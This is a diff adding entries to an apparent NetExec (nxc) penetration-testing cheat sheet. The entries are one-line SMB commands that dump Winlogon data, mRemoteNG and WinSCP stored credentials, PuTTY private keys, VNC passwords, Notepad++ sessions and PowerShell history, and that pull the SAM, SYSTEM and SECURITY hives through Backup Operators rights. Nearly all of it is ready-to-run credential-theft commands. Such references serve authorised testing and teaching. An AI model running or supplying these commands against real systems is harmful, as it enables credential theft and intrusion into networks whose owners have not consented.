@@ -102,3 +102,40 @@
 
     nxc smb <ip> -u user -p password --dpapi nosystem
 
+# Dump Winlogon registration data
+
+    nxc smb IP -u USER -p PASSWORD -M reg-winlogon
+
+# Dump Stored Credentials from mRemoteNG Configuration
+
+    nxc smb IP -u USER -p PASSWORD -M mremoteng
+
+# Dump PuTTY Private Keys
+
+    nxc smb IP -u USER -p PASSWORD -M putty
+
+### View the Dumped Key locally
+
+    cat PuTTYKey.sec
+
+# Dump Notepad++ Session Logs
+
+    nxc smb IP -u USER -p PASSWORD -M notepad++
+
+# Dump Powershell Command History
+
+    nxc smb IP -u USER -p PASSWORD -M powershell_history
+
+# Dump WinSCP configuration files
+
+    nxc smb IP -u USER -p PASSWORD -M winscp
+
+# Dump VNC passwords
+
+    nxc smb IP -u USER -p PASSWORD -M vnc
+
+# Dump Backup Operators Permission (SAM, SYSTEM and SECURITY hives)
+
+Automate the process using this module if the target user belongs to the group Backup Operators
+
+    nxc smb IP -u USER -p PASSWORD -M backup_operator
